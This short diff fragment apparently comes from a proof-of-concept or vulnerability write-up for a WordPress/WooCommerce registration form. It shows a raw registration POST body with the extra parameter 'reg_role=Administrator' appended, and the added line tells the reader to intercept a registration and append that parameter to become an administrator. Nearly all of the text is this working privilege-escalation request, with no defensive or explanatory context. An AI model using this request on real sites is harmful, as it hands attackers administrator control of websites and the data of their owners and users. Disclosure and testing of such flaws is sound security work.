@@ -26,3 +26,5 @@ Connection: close
 
 email=robbie@wordpress.lan&password=testest123%21&woocommerce-register-nonce=bfg37lz911&_wp_http_referer=%2Fmy-account%2F&register=Register&reg_role=Administrator
 ```
+
+Intercept the registion and then just add `reg_role=Administrator` on the end and your now admin
